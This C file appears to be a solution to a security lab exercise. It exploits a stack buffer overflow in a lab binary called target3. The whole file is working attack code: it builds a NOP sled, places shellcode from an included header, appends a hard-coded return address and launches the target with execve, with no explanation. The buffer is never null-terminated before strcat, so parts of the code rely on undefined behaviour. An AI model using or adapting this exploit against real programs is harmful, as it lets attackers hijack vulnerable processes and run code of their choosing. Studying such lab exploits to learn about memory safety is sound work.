#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"
#define DEFAULT_BUFFER_SIZE  64
#define NOP 0x90
#define ZERO 0x00
int
main ( int argc, char * argv[] )
{	
	char *	args[3];
	char *	env[1];
	int bsize = DEFAULT_BUFFER_SIZE;
	char* buff, *ptr;
	if (argc>1) bsize = atoi(argv[1]);	
	
	if(!(buff = (char*)malloc(bsize * sizeof(char)))){
		printf("can't allocate memory\n");
		exit(0);	
	}

	unsigned long *add_ptr;
	int i;
	for (i = 0; i < bsize; i++){
		buff[i] = NOP;
	}

	ptr = buff + bsize - strlen(shellcode) - 4 ;
	for (i=0; i<strlen(shellcode); i++){
		*(ptr++) = shellcode[i];
	}
	char * s = "\x18\xfe\xa4\x40\x00";
	
	args[0] = TARGET;
	args[1] = strcat(buff, s);
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
